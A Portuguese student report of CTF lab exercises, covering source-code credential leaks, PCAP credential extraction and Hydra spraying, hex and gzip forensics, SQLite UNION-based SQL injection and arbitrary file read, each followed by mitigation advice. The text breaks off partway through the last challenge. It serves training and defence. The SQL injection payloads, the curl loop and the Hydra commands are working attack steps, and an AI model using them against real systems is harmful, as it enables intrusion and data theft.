---
title: "Relatório CTF's"
author: ["Pedro Rodrigues"]
date: "2026-05-26"
subject: "Relatório EXITNODE - CTF, picoCTF,  CTF Warmup"
keywords: [Cibersegurança, CTF, Pentest, Wireshark]
subtitle: "UFCD 9197 - Wargaming"
lang: "pt-PT"
titlepage: true
titlepage-color: "0b5394"
titlepage-text-color: "FFFFFF"
titlepage-rule-color: "FFFFFF"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
---
# Relatório Final — Wargaming

**UFCD 9196 - Wargaming**

**Elaborado por:** Pedro Rodrigues

---

## Estrutura do relatório

Este documento reúne o relatório dos exercícios realizados:

1. EXITNODE - CTF  
2. Exercícios picoCTF  
3. CTF Warmup  

---



# Parte I — EXITNODE - CTF

# Ex1 /etc/hosts

Comecei por adicionnar o IP's e dominios ao ficheiro hosts em /etc/hosts.

![Adicionei os IPS e os seus respetivos dominios no ficheiro /etc/hosts](resources/2026-05-07-17-51-16.png)


# CH01a

## 1. Identificação do desafio

**Categoria:** Recon  
**Alvo:** `http://ch01-web`  
**Objetivo:** Encontrar as credenciais de login do Ron e aceder ao dashboard WiFi do café.

---

## 2. Contexto inicial

O desafio indicava que Ron, o dono do café, tinha uma password WPA2 fraca:

```text
password123
```

No entanto, o objetivo desta fase era aceder ao portal do café e encontrar as credenciais de login do Ron.

A hint fornecida foi:

```text
Developers leave things in the source code.
Right-click, View Page Source.
```

Isto sugeria que a informação sensível poderia estar presente no código-fonte HTML da página.

---

## 3. Análise inicial da página

Foi acedido o portal:

```text
http://ch01-web
```

Na página inicial existia um formulário de login para acesso ao painel do café.

Seguindo a hint do desafio, foi usado o browser para abrir o código-fonte da página:

```text
Right click → View Page Source
```

ou, alternativamente:

```text
Ctrl + U
```

---

## 4. Descoberta das credenciais no código-fonte

Ao analisar o source code da página, foi encontrada uma informação sensível deixada pelo developer.

A password estava exposta diretamente no código-fonte da página.

![Descoberta da palavra-passe](resources/2026-05-07-17-52-51.png)

Esta falha permitiu identificar as credenciais necessárias para aceder ao portal.

---

## 5. Login no portal

Após obter a password através do código-fonte, foi feito login com a conta do Ron.

Depois da autenticação, foi possível aceder à página inicial/dashboard do portal.

![Home page](resources/2026-05-07-17-53-46.png)

---

## 6. Cadeia de exploração

A exploração completa seguiu a seguinte sequência:

```text
Acesso ao ch01-web
→ análise da página inicial
→ leitura da hint do desafio
→ abertura do View Page Source
→ descoberta de credenciais/password no código-fonte
→ login com a conta do Ron
→ acesso ao WiFi dashboard
```

---

## 7. Vulnerabilidade identificada

A falha explorada foi **exposição de informação sensível no código-fonte do cliente**.

A aplicação continha credenciais ou pistas de autenticação diretamente no HTML enviado ao browser.

Este tipo de falha é crítico porque qualquer utilizador pode consultar o source code da página sem ferramentas avançadas.

---

## 8. Impacto

Esta falha permitiu:

- descobrir credenciais sem autenticação;
- aceder ao painel privado do Ron;
- consultar o dashboard WiFi do café;
- avançar no desafio sem necessidade de exploração técnica complexa.

Num cenário real, expor passwords, tokens, chaves de API ou comentários sensíveis no frontend poderia permitir acesso indevido a sistemas internos.

---

## 9. Recomendações de mitigação

### 9.1. Nunca colocar credenciais no frontend

Passwords, tokens, chaves de API e segredos nunca devem estar presentes em ficheiros HTML, JavaScript ou comentários de código enviados ao cliente.

---

### 9.2. Remover comentários sensíveis

Comentários como:

```text
TODO
password
admin
debug
secret
```

devem ser removidos antes de colocar aplicações em produção.

---

### 9.3. Usar gestão segura de segredos

Credenciais devem ser armazenadas de forma segura no servidor ou num secret manager, nunca no código cliente.

---

### 9.4. Fazer revisão de código antes de produção

Deve existir um processo de revisão para detetar informação sensível antes de publicar uma aplicação.

---

### 9.5. Monitorizar exposição de secrets

Ferramentas de secret scanning devem ser usadas para detetar credenciais acidentalmente expostas em repositórios, builds ou páginas públicas.

---

## 10. Conclusão

Neste desafio foi explorada uma falha simples de recon: informação sensível deixada no código-fonte da página.

Ao abrir o **View Page Source**, foi possível encontrar a password necessária para aceder ao portal do Ron. Com essas credenciais, foi efetuado login e acedido o dashboard WiFi do café.

O desafio demonstra a importância de não deixar credenciais, comentários sensíveis ou informação interna no frontend de uma aplicação web.


# CH02

## 1. Identificação do desafio

**Categoria:** Credential Chain  
**Serviços alvo:**  
- SSH: `ch02-ssh`
- FTP: `ch02-ftp`
- Web: `ch02-web`

**Objetivo:** Utilizar credenciais encontradas em tráfego de rede e explorar reutilização de passwords entre serviços para avançar na cadeia de acesso até obter a flag.

---

## 2. Contexto inicial

O desafio indicava que a política de passwords da Evil Corp era fraca e que existia reutilização de credenciais entre serviços.

A hint fornecida foi:

```text
The PCAP warmups contain a successful login.
Those credentials work on more than one service.
```

Isto sugeria que a primeira etapa consistia em analisar um ficheiro PCAP anterior, encontrar credenciais válidas e depois testá-las nos serviços disponíveis.

---

## 3. Análise do tráfego PCAP

Para procurar logins HTTP no ficheiro PCAP, foi usado um filtro no Wireshark:

```text
http.request.method == "POST" && http.request.uri contains "login"
```

Este filtro permitiu identificar pedidos POST relacionados com formulários de login.

Posteriormente, foi usado `tshark` para extrair automaticamente os campos enviados nos formulários.

Comando utilizado:

```bash
tshark -r ../CTF\ -\ Warmup-20260414/01.challenge.pcap -Y 'http.request.method == "POST"' -T fields \
-e urlencoded-form.key \
-e urlencoded-form.value 2>/dev/null \
| awk -F'\t' '$1=="username,password" {print $2}' \
| sort -u > creds.txt

cat creds.txt | tr ',' ':' > creds_colon.txt
cut -d',' -f1 creds.txt | sort -u > users.txt
cut -d',' -f2- creds.txt | sort -u > passwords.txt
```

Este processo gerou três ficheiros:

```text
creds.txt        → pares username,password
creds_colon.txt  → pares username:password
users.txt        → lista de utilizadores
passwords.txt    → lista de passwords
```

![Users e passwords extraídos](resources/2026-05-12-10-24-44.png)

---

## 4. Identificação dos serviços e IPs

De seguida, foi necessário identificar o IP associado a cada serviço:

```text
ch02-ssh
ch02-ftp
ch02-web
```

Foi confirmado que cada serviço tinha um IP específico, o que era importante para os testes com Hydra e para acessos diretos.

![IPs dos serviços](resources/2026-05-12-10-30-40.png)

---

## 5. Teste de credenciais no serviço Web

Foi inicialmente testado o serviço web com Hydra, usando o ficheiro `creds_colon.txt`.

Comando utilizado:

```bash
hydra -C creds_colon.txt -t 1 -f ch02-web http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```

A opção `-C` permitiu usar pares no formato:

```text
username:password
```

A opção `-t 1` foi usada para evitar uma abordagem agressiva e reduzir o número de tentativas simultâneas.

Nesta fase, não foi encontrada nenhuma credencial válida diretamente para o serviço web.

![Sem credenciais válidas na Web](resources/2026-05-12-11-15-28.png)

---

## 6. Teste de credenciais no serviço FTP

De seguida, foram testadas as mesmas credenciais no serviço FTP.

Comando utilizado:

```bash
hydra -C creds_colon.txt -t 1 -f 172.30.3.34 ftp
```

Este teste encontrou uma credencial válida para FTP.

![Credencial FTP encontrada](resources/2026-05-12-11-12-46.png)

Foi então feito login no FTP:

```bash
ftp gideon.goddard@172.30.3.34
```

---

## 7. Enumeração no FTP

Após entrar no FTP, foi feita enumeração dos ficheiros disponíveis.

Durante a análise, foi encontrado um ficheiro chamado:

```text
it_credentials.txt
```

![Ficheiro it_credentials.txt encontrado](resources/2026-05-12-11-18-23.png)

Este ficheiro continha credenciais adicionais para o serviço web.

---

## 8. Credenciais do painel Web

O ficheiro encontrado no FTP revelou credenciais para o painel web:

```text
URL: http://ch02-web
Username: it_helpdesk
Password: H3lpD3sk2015
```

![Credenciais Web encontradas](resources/2026-05-12-11-20-28.png)

Com estas credenciais foi possível aceder ao painel web da aplicação.

---

## 9. Credenciais de sistema encontradas no painel

Após aceder ao painel web com a conta `it_helpdesk`, foi encontrada nova informação sensível.

O painel revelou credenciais de sistema para acesso SSH:

```text
sysadmin:Sup3r$ecure!
```

![Credenciais SSH encontradas](resources/2026-05-12-11-23-31.png)

Estas credenciais permitiram avançar para o serviço SSH.

---

## 10. Acesso SSH

Com as credenciais obtidas no painel web, foi feito login por SSH:

```bash
ssh sysadmin@172.30.3.32
```

Password utilizada:

```text
Sup3r$ecure!
```

Após autenticação bem-sucedida, foi possível aceder ao sistema como `sysadmin`.

---

## 11. Obtenção da flag

Depois do acesso SSH, foi encontrada a flag do desafio.

![Flag encontrada](resources/2026-05-12-11-28-17.png)

Flag obtida:

```text
FLAG{ch02_7fe369a1694640cbcc6368c3d4085eb7}
```

---

## 12. Observações adicionais

Durante a exploração foi ainda identificado conteúdo suspeito que poderia servir como pista para desafios posteriores.

![Pista adicional encontrada](resources/2026-05-12-11-36-40.png)

Esta informação foi registada para referência futura.

---

## 13. Cadeia de exploração

A exploração completa seguiu a seguinte sequência:

```text
Análise do PCAP
→ extração de credenciais com tshark
→ criação de listas de users/passwords
→ teste controlado com Hydra
→ tentativa inicial no serviço web sem sucesso
→ teste no FTP
→ descoberta de credencial FTP válida
→ acesso ao FTP
→ descoberta de it_credentials.txt
→ obtenção de credenciais do painel web
→ login no ch02-web como it_helpdesk
→ descoberta de credenciais SSH
→ login SSH como sysadmin
→ obtenção da flag
```

---

## 14. Vulnerabilidades e falhas identificadas

### 14.1. Credenciais expostas em tráfego de rede

O ficheiro PCAP continha credenciais submetidas através de formulários HTTP.

Isto permitiu extrair utilizadores e passwords diretamente do tráfego.

---

### 14.2. Reutilização de credenciais

As credenciais obtidas inicialmente foram úteis noutros serviços.

A reutilização de passwords entre serviços facilitou o movimento lateral.

---

### 14.3. Ficheiros sensíveis no FTP

O serviço FTP continha um ficheiro com credenciais internas:

```text
it_credentials.txt
```

Este ficheiro permitiu aceder ao painel web.

---

### 14.4. Exposição de credenciais no painel administrativo

O painel web acessível com a conta `it_helpdesk` revelou credenciais SSH de um utilizador com maior privilégio:

```text
sysadmin:Sup3r$ecure!
```

---

## 15. Impacto

A cadeia de falhas permitiu:

- extrair credenciais de tráfego de rede;
- reutilizar credenciais em serviços diferentes;
- aceder ao FTP;
- obter credenciais do painel web;
- aceder ao painel de administração;
- obter credenciais SSH;
- aceder ao sistema como `sysadmin`;
- recuperar a flag.

Num cenário real, esta cadeia representaria um comprometimento progressivo da infraestrutura devido a má gestão de credenciais.

---

## 16. Recomendações de mitigação

### 16.1. Usar HTTPS

Credenciais não devem ser transmitidas em texto claro.

Todos os formulários de login devem usar HTTPS/TLS.

---

### 16.2. Proibir reutilização de passwords

Passwords não devem ser reutilizadas entre serviços diferentes.

Deve existir uma política de passwords robusta e gestão centralizada de identidade.

---

### 16.3. Remover credenciais de ficheiros acessíveis

Ficheiros como `it_credentials.txt` não devem conter passwords em texto claro.

Credenciais devem ser armazenadas em secret managers apropriados.

---

### 16.4. Restringir acesso FTP

O acesso FTP deve ser limitado, monitorizado e, quando possível, substituído por alternativas seguras como SFTP.

---

### 16.5. Implementar MFA

A autenticação multifator reduziria o impacto da exposição de passwords.

---

### 16.6. Princípio do menor privilégio

A conta `it_helpdesk` não deveria ter acesso a credenciais SSH privilegiadas.

Cada conta deve ter apenas o acesso estritamente necessário.

---

## 17. Conclusão

Neste desafio foi explorada uma cadeia de credenciais através de múltiplos serviços.

A análise do PCAP permitiu extrair credenciais iniciais. Essas credenciais foram testadas de forma controlada com Hydra e permitiram acesso ao FTP. No FTP foi encontrado um ficheiro com credenciais para o painel web. Após aceder ao painel, foram obtidas credenciais SSH de `sysadmin`, permitindo acesso ao sistema e recuperação da flag.

A flag obtida foi:

```text
FLAG{ch02_7fe369a1694640cbcc6368c3d4085eb7}
```

O desafio demonstra como a reutilização de credenciais, passwords em texto claro e má segregação entre serviços podem permitir uma cadeia completa de compromisso.


# CH03

## 1. Identificação do desafio

**Categoria:** Forensics — Encoding  
**Ficheiro analisado:** `ecorp_malware.dat`  
**Fonte:** `http://assets-server/eb60bf3f-6e7e-e8f4-c114-e7912c45bfd0/`  
**Objetivo:** Analisar um ficheiro suspeito `.dat`, identificar as camadas de codificação/encapsulamento e recuperar a flag.

---

## 2. Contexto inicial

O desafio indicava que a Allsafe tinha sido comprometida e que alguém tinha colocado um possível rootkit nos servidores da E Corp.

A descrição indicava:

```text
Allsafe got hit. Someone planted a rootkit on the E Corp servers.
Angela says the data is encrypted.
Let me take a look at this .dat file...
```

O ficheiro fornecido tinha a extensão:

```text
.dat
```

Esta extensão não indica necessariamente o tipo real do ficheiro, por isso foi necessário analisá-lo manualmente.

---

## 3. Análise inicial do ficheiro

Após abrir o link fornecido pelo desafio, foi verificado o conteúdo disponível e lida a nota no `README`.

A nota indicava algo relacionado com:

```text
remover as camadas
```

Esta pista sugeria que o ficheiro poderia conter várias camadas de encoding, compressão ou transformação.

Com base nisso, foram consideradas algumas hipóteses:

```text
dados codificados em hexadecimal
ficheiro comprimido
magic numbers alterados
camadas sucessivas de encoding
```

---

## 4. Identificação do tipo de ficheiro

O primeiro passo foi usar o comando `file`:

```bash
file ecorp_malware.dat
```

Este comando serve para identificar o tipo de ficheiro com base no seu conteúdo e magic numbers, e não apenas pela extensão.

Também foi usado o comando `strings`:

```bash
strings ecorp_malware.dat
```

O objetivo era procurar texto legível dentro do ficheiro e perceber se existiam pistas, dados codificados ou padrões reconhecíveis.

![Tentativas iniciais](resources/2026-05-12-11-49-22.png)

---

## 5. Observação do conteúdo

A análise inicial indicou que o ficheiro continha uma sequência de caracteres ASCII aparentemente composta por valores hexadecimais.

Isto sugeriu que o ficheiro não era diretamente o binário final, mas sim uma representação em texto de dados binários.

Ou seja, o conteúdo parecia estar numa camada de encoding em hexadecimal.

---

## 6. Conversão de hexadecimal para binário

Para remover a camada hexadecimal, foi usado o comando `xxd`.

O comando utilizado foi:

```bash
xxd -r -p ecorp_malware.dat > output
```

Explicação das opções:

```text
-r  → reverse, converte de volta de hexadecimal para binário
-p  → plain, indica que o input está em formato hexadecimal simples/plain text
```

Assim, o `xxd` converteu a representação hexadecimal presente em `ecorp_malware.dat` para o ficheiro binário real.

---

## 7. Identificação da camada gzip

Depois da conversão com `xxd`, o ficheiro resultante foi novamente analisado com `file`.

Foi então identificado que o conteúdo convertido correspondia a um ficheiro comprimido em formato gzip.

![Ficheiro gzip identificado](resources/2026-05-12-12-06-25.png)

Isto confirmou que a primeira camada era hexadecimal e que, depois de removida, existia uma segunda camada de compressão.

---

## 8. Descompressão do ficheiro

Após identificar o ficheiro como gzip, foi feita a descompressão com uma ferramenta adequada, como `gunzip`.

O processo seguido foi conceptualmente:

```text
ecorp_malware.dat
→ converter hexadecimal para binário com xxd -r -p
→ identificar gzip
→ descomprimir
→ obter conteúdo final
```

Depois de remover as camadas, foi possível chegar ao conteúdo que continha a flag.

---

## 9. Flag obtida

A flag encontrada foi:

```text
FLAG{ch03_b82365611fbd11f9e1cf011c178d2d2a}
```

---

## 10. Cadeia de análise

A análise completa seguiu a seguinte sequência:

```text
Download do ficheiro ecorp_malware.dat
→ leitura da pista no README
→ análise com file
→ análise com strings
→ identificação de conteúdo ASCII/hexadecimal
→ conversão de hexadecimal para binário com xxd -r -p
→ nova análise com file
→ identificação de ficheiro gzip
→ descompressão da camada gzip
→ recuperação da flag
```

---

## 11. Técnicas utilizadas

### 11.1. File type identification

Foi usado o comando:

```bash
file ecorp_malware.dat
```

para identificar o tipo real do ficheiro.

---

### 11.2. Extração de strings

Foi usado:

```bash
strings ecorp_malware.dat
```

para procurar texto legível e perceber se existia encoding textual.

---

### 11.3. Conversão hexadecimal

Foi usado:

```bash
xxd -r -p
```

para converter dados em hexadecimal para o respetivo formato binário.

---

### 11.4. Descompressão gzip

Depois de identificada a camada gzip, foi feita a descompressão para obter o conteúdo final.

---

## 12. Vulnerabilidade/conceito explorado

Este desafio não explorava uma vulnerabilidade web ou de sistema, mas sim um conceito de forense e encoding.

O ficheiro escondia a informação através de camadas:

```text
hexadecimal
gzip
conteúdo final
```

A pista “remover as camadas” indicava que era necessário analisar o ficheiro por etapas e não assumir que a extensão `.dat` representava o formato real.

---

## 13. Impacto e aprendizagem

Este exercício demonstrou a importância de:

```text
não confiar na extensão do ficheiro
usar file para identificar o conteúdo real
usar strings para encontrar pistas
reconhecer dados codificados em hexadecimal
converter representações textuais em binário
analisar ficheiros em camadas
```

Em contexto real, malware, payloads e dados exfiltrados podem ser codificados ou comprimidos em várias camadas para dificultar análise ou deteção.

---

## 14. Recomendações

Numa análise forense real, recomenda-se:

```text
preservar o ficheiro original
trabalhar sempre sobre cópias
calcular hashes antes e depois da análise
documentar cada transformação aplicada
usar ferramentas como file, strings, xxd, binwalk e foremost
validar cada camada antes de avançar
```

Também seria útil registar hashes:

```bash
sha256sum ecorp_malware.dat
sha256sum ficheiro_convertido
```

para manter integridade e rastreabilidade da análise.

---

## 15. Conclusão

Neste desafio foi analisado um ficheiro suspeito `.dat` associado a um possível rootkit.

A análise inicial revelou que o ficheiro continha dados em formato ASCII, aparentemente hexadecimal. Com o comando `xxd -r -p`, foi possível converter essa camada hexadecimal para binário. A análise seguinte mostrou que o resultado era um ficheiro gzip, que foi então descomprimido.

Após remover as camadas de encoding e compressão, foi obtida a flag:

```text
FLAG{ch03_b82365611fbd11f9e1cf011c178d2d2a}
```

O desafio demonstrou a importância de analisar ficheiros em camadas e de usar ferramentas básicas de forense para identificar e transformar corretamente dados codificados.


# CH01b

## 1. Identificação do desafio

**Categoria:** Web — SQL Injection  
**Alvo:** `http://ch01-web`  
**Objetivo:** Explorar uma vulnerabilidade de SQL Injection no formulário de login e, posteriormente, utilizar a funcionalidade disponível após autenticação para extrair informação de uma tabela não autorizada.

---

## 2. Contexto inicial

O desafio indicava que o utilizador já se encontrava dentro do portal do Ron, mas que existia informação escondida relacionada com um item chamado **Special Brew** e uma lista secreta de clientes.

A hint indicava:

```text
The login form is vulnerable to SQL injection.
Try manipulating the query to read data from other tables.
```

Isto sugeria que o formulário de login não tinha sido corrigido e permitia manipular queries SQL, possibilitando a leitura de dados de outras tabelas da base de dados.

---

## 3. Testes iniciais de SQL Injection

A primeira abordagem foi testar payloads diretamente no formulário de login da aplicação web.

Foram testados payloads como:

```sql
' ORDER BY 1-- -
```

e variações semelhantes para perceber se a query era vulnerável e quantas colunas estavam a ser usadas internamente.

Inicialmente, os testes manuais não foram suficientes para perceber claramente o comportamento da aplicação. Por isso, foi criado um pequeno script com `curl` para observar os códigos HTTP devolvidos pela aplicação.

---

## 4. Enumeração do número de colunas

Foi usado um ciclo em Bash para testar diferentes valores de `ORDER BY` e observar se a aplicação respondia com `200` ou `302`.

O objetivo era perceber até que número de colunas a query continuava válida.

Código utilizado:

```bash
for i in $(seq 1 10); do
  echo -n "ORDER BY $i -> "
  curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n"   -X POST http://ch01-web   --data-urlencode "username=' OR '1'='1' ORDER BY $i-- -"   -d "password=test"
done
```

A análise das respostas permitiu concluir que a query tinha **5 colunas**.

![Descoberta das colunas](resources/2026-05-25-10-55-25.png)

A resposta `302` indicava que o login tinha sido aceite/redirecionado, enquanto erros ou comportamentos diferentes indicavam que o payload deixava de ser válido.

---

## 5. Tentativas iniciais sem sucesso

Após confirmar a existência de SQL Injection, foram feitas várias tentativas para extrair dados diretamente através do login.

Nem todos os payloads deram resultado imediato, pelo que foi necessário continuar a explorar o comportamento da aplicação após o login.

![Teste sem sucesso](resources/2026-05-25-11-02-27.png)

---

## 6. Descoberta de manipulação do nome após login

Depois de aceder à aplicação, foi identificado que existia uma funcionalidade onde era possível alterar o nome apresentado no portal.

Essa funcionalidade também era influenciada pela SQL Injection e permitia refletir dados na página.

Foi testado o seguinte payload:

```sql
' UNION SELECT 1,'teste',3,4,5-- -
```

Este payload confirmou que era possível controlar o valor apresentado no campo do nome.

![Tentativa de manipulação](resources/2026-05-25-11-10-41.png)

![Resultado da manipulação](resources/2026-05-25-11-11-40.png)

Esta etapa foi importante porque mostrou qual das colunas era refletida na página, permitindo usar essa posição para extrair dados da base de dados.

---

## 7. Enumeração das tabelas da base de dados

Como a base de dados usada era SQLite, foi usada a tabela interna `sqlite_master` para listar as tabelas existentes.

Payload utilizado:

```sql
' UNION SELECT 1,group_concat(name),3,4,5 FROM sqlite_master WHERE type='table'-- -
```

Este payload permitiu listar os nomes das tabelas existentes na base de dados.

Entre as tabelas encontradas, foi identificada uma tabela relevante:

```text
secret_clients
```

![Enumeração das tabelas](resources/2026-05-25-11-08-04.png)

---

## 8. Enumeração das colunas da tabela `secret_clients`

Depois de identificar a tabela `secret_clients`, foi usado o `pragma_table_info` do SQLite para enumerar as colunas da tabela.

Payload utilizado:

```sql
' UNION SELECT 1,group_concat(name),3,4,5 FROM pragma_table_info('secret_clients')-- -
```

Este payload permitiu identificar os nomes das colunas da tabela.

As colunas relevantes eram:

```text
id
client_alias
real_identity
service_type
notes
added_on
```

---

## 9. Extração dos dados da tabela secreta

Depois de conhecer a estrutura da tabela, foi usado um payload com `group_concat` para extrair os dados da tabela `secret_clients`.

Payload utilizado:

```sql
' UNION SELECT 1,group_concat(id || ':' || client_alias || ':' || real_identity || ':' || service_type || ':' || notes || ':' || added_on),3,4,5 FROM secret_clients-- -
```

Este payload concatenou os valores das colunas numa única saída, permitindo visualizar os dados da tabela secreta diretamente na aplicação.

![Flag encontrada](resources/2026-05-25-11-25-04.png)

---

## 10. Flag obtida

A flag encontrada foi:

```text
FLAG{ch01_3c228b38c5045cf5267c3e345d8bb9da}
```

---

## 11. Cadeia de exploração

A exploração completa seguiu a seguinte sequência:

```text
Acesso ao portal ch01-web
→ teste de SQL Injection no login
→ uso de ORDER BY para identificar número de colunas
→ confirmação de 5 colunas
→ autenticação/redirecionamento através de SQL Injection
→ identificação de funcionalidade pós-login que refletia o nome
→ teste com UNION SELECT
→ confirmação de coluna refletida com 'teste'
→ enumeração das tabelas via sqlite_master
→ descoberta da tabela secret_clients
→ enumeração das colunas com pragma_table_info
→ extração dos dados com group_concat
→ obtenção da flag
```

---

## 12. Vulnerabilidade identificada

A vulnerabilidade explorada foi **SQL Injection**.

A aplicação aceitava input do utilizador diretamente na query SQL sem validação ou parametrização adequada.

Foram explorados dois pontos principais:

```text
Formulário de login vulnerável
Funcionalidade pós-login que refletia dados manipuláveis via UNION SELECT
```

A ausência de queries parametrizadas permitiu manipular a query original e consultar tabelas internas da base de dados.

---

## 13. Impacto

Esta vulnerabilidade permitiu:

- contornar ou manipular o processo de login;
- descobrir o número de colunas da query;
- executar `UNION SELECT`;
- enumerar tabelas internas da base de dados;
- descobrir a estrutura da tabela `secret_clients`;
- extrair informação sensível não autorizada;
- obter a flag do desafio.

Num cenário real, esta falha poderia permitir acesso a dados confidenciais, credenciais, informação de clientes e dados internos da aplicação.

---

## 14. Recomendações de mitigação

### 14.1. Usar queries parametrizadas

A aplicação deve usar prepared statements/queries parametrizadas em todas as interações com a base de dados.

Exemplo conceptual:

```text
SELECT * FROM users WHERE username = ? AND password = ?
```

em vez de concatenar diretamente input do utilizador na query.

---

### 14.2. Validar e normalizar input

Todos os campos de input devem ser validados com base no formato esperado.

No entanto, validação de input não substitui o uso de queries parametrizadas.

---

### 14.3. Remover mensagens e comportamentos que revelem estrutura interna

Diferenças entre respostas HTTP, erros SQL ou redirecionamentos podem ajudar um atacante a inferir a estrutura da query.

A aplicação deve responder de forma controlada e genérica a erros.

---

### 14.4. Restringir privilégios da conta da base de dados

A conta usada pela aplicação deve ter apenas as permissões estritamente necessárias.

Idealmente, uma funcionalidade de login não deveria conseguir consultar tabelas sensíveis como `secret_clients`.

---

### 14.5. Monitorização e alertas

Devem existir alertas para padrões típicos de SQL Injection, como:

```text
UNION SELECT
ORDER BY
sqlite_master
pragma_table_info
' OR '1'='1
```

---

## 15. Conclusão

Neste desafio foi explorada uma vulnerabilidade de SQL Injection no portal `ch01-web`.

Através de testes com `ORDER BY`, foi identificado que a query usava 5 colunas. Posteriormente, foi usada uma funcionalidade pós-login que refletia o nome do utilizador para executar payloads com `UNION SELECT`.

Com recurso a `sqlite_master`, foi possível enumerar as tabelas da base de dados e identificar a tabela `secret_clients`. De seguida, com `pragma_table_info`, foram descobertas as colunas da tabela e, finalmente, os dados foram extraídos com `group_concat`.

A flag obtida foi:

```text
FLAG{ch01_3c228b38c5045cf5267c3e345d8bb9da}
```

O desafio demonstra como uma SQL Injection aparentemente simples pode evoluir para enumeração completa da base de dados e extração de informação sensível.


### COnsegui ver as colunas que continha na tabela Secret_clients


![Colunas da tabela Secret_clients](resources/2026-05-25-11-18-44.png)

# CH04



## 1. Identificação do desafio

**Categoria:** Web — Multi-stage Exploitation  
**Alvo:** `http://ch04-web`  
**Objetivo:** Explorar uma aplicação web vulnerável através de várias fases, começando por enumeração, leitura indevida de ficheiros, descoberta de credenciais e acesso à flag.

---

## 2. Reconhecimento inicial

Durante a fase inicial de reconhecimento, foi consultado o ficheiro `robots.txt` do alvo através do browser:

```text
http://ch04-web/robots.txt
```

O conteúdo encontrado foi:

```text
User-agent: *
Disallow: /dashboard/files
Disallow: /dashboard/maintenance
# Steel Mountain Facility Management v2.1
```

Este ficheiro revelou duas rotas interessantes:

```text
/dashboard/files
/dashboard/maintenance
```

A presença destas entradas indicava que existiam áreas internas da aplicação que os administradores não queriam que fossem indexadas.

Embora o `robots.txt` não seja uma vulnerabilidade por si só, neste caso serviu como pista para identificar funcionalidades sensíveis da aplicação.

---

## 3. Descoberta do endpoint vulnerável

Ao investigar a rota `/dashboard/files` através do browser, foi identificado um parâmetro chamado `path`, utilizado pela aplicação para apresentar ficheiros do servidor.

Foi testado o seguinte caminho diretamente na barra de endereços:

```text
http://ch04-web/dashboard/files?path=/var/www/backups/config.bak
```

A aplicação devolveu o conteúdo do ficheiro `config.bak`, confirmando uma vulnerabilidade de **leitura arbitrária de ficheiros** (*arbitrary file read* / *local file disclosure*).

Esta falha permitia fornecer um caminho absoluto no parâmetro `path` e visualizar o conteúdo de ficheiros internos do servidor através da própria página web.

---

## 4. Leitura de ficheiros internos

Através da vulnerabilidade no parâmetro `path`, foi possível ler ficheiros internos do servidor.

### 4.1. Ficheiro de logs

Foi analisado o ficheiro:

```text
/var/www/data/logs/access.log
```

Através do browser, foi acedido o seguinte URL:

```text
http://ch04-web/dashboard/files?path=/var/www/data/logs/access.log
```

O conteúdo apresentado pela aplicação incluía eventos relevantes:

```text
2015-05-08 08:12:01 INFO  operator login from 10.10.1.15
2015-05-08 08:15:33 INFO  temperature check: Zone A nominal
2015-05-08 09:01:12 INFO  humidity check: Zone B nominal
2015-05-08 12:30:00 WARN  backup power test initiated
2015-05-08 12:30:45 INFO  backup power test passed
2015-05-09 07:55:00 INFO  operator login from 10.10.1.15
2015-05-09 08:00:12 INFO  scheduled maintenance window opened
2015-05-09 08:01:00 INFO  config backup created -> /var/www/backups/config.bak
2015-05-09 08:45:00 INFO  maintenance window closed
```

A linha mais importante foi:

```text
config backup created -> /var/www/backups/config.bak
```

Esta pista indicava a localização de um ficheiro de backup com possível informação sensível.

---

## 5. Descoberta de credenciais

Ao aceder ao ficheiro indicado nos logs:

```text
/var/www/backups/config.bak
```

através do URL:

```text
http://ch04-web/dashboard/files?path=/var/www/backups/config.bak
```

foi obtido o seguinte conteúdo:

```text
# Steel Mountain Facility Management
# Backup created: 2015-05-09
operator_user=operator
operator_pass=sm_oper8!
admin_user=admin
admin_pass=st33l_m0unt41n_2015
```
![Credenciais](resources/2026-05-25-11-55-27.png)

Foram descobertas duas contas válidas:

```text
operator : sm_oper8!
admin    : st33l_m0unt41n_2015
```

Estas credenciais estavam armazenadas em texto claro dentro de um ficheiro de backup acessível pela aplicação.

---

## 6. Acesso ao dashboard

Com as credenciais encontradas no ficheiro de backup, foi possível autenticar na aplicação através da página de login.

A conta com maior privilégio era:

```text
admin : st33l_m0unt41n_2015
```

Após o login, foi possível continuar a utilizar a funcionalidade `/dashboard/files` para consultar ficheiros internos através do browser.

---

## 7. Análise adicional dos ficheiros internos

Foi também analisado o relatório mensal:

```text
/var/www/data/reports/may-2015.txt
```

Através do URL:

```text
http://ch04-web/dashboard/files?path=/var/www/data/reports/may-2015.txt
```

O conteúdo apresentado foi:

```text
Steel Mountain - Monthly Facility Report
Month: May 2015
Status: OPERATIONAL

Zone A Temperature: 68.2F (nominal)
Zone B Temperature: 67.8F (nominal)
Zone C Temperature: 69.1F (nominal)

Humidity Levels: Within tolerance
Power Grid: Stable
Backup Generator: Last tested 2015-05-08 (PASS)

Notes:
- Scheduled maintenance completed 2015-05-09
- Config backup rotated
- No incidents reported
```

A nota:

```text
Config backup rotated
```

reforçava que os backups de configuração eram uma parte importante do desafio.

---

## 8. Descoberta do caminho da flag

Durante a análise, foi identificado o funcionamento do ambiente e a localização onde a flag era escrita:

```bash
FLAG="${FLAG:-FLAG_NOT_SET}"
echo "$FLAG" > /opt/steel-mountain/flag.txt
chown root:root /opt/steel-mountain/flag.txt
chmod 444 /opt/steel-mountain/flag.txt
chattr +i /opt/steel-mountain/flag.txt 2>/dev/null || true
```

A linha mais importante era:

```bash
echo "$FLAG" > /opt/steel-mountain/flag.txt
```

Isto revelou que a flag se encontrava em:

```text
/opt/steel-mountain/flag.txt
```

Além disso, o ficheiro tinha permissões `444`, ou seja, era legível por todos os utilizadores:

```bash
chmod 444 /opt/steel-mountain/flag.txt
```

---

## 9. Leitura da flag

Após descobrir que a flag estava localizada em:

```text
/opt/steel-mountain/flag.txt
```

foi utilizado o próprio endpoint vulnerável da aplicação através do browser.

O caminho foi colocado diretamente no parâmetro `path` da página `/dashboard/files`:

```text
http://ch04-web/dashboard/files?path=/opt/steel-mountain/flag.txt
```

Como o endpoint permitia ler ficheiros internos do servidor e o ficheiro da flag tinha permissões de leitura, a aplicação apresentou o conteúdo da flag na própria página web.

A flag obtida foi:

```text
FLAG{ch04_20584aa252e05063da758c1952a313f8}
```

---

## 10. Cadeia de exploração

A exploração completa foi feita através da interface web e seguiu a seguinte sequência:

```text
robots.txt
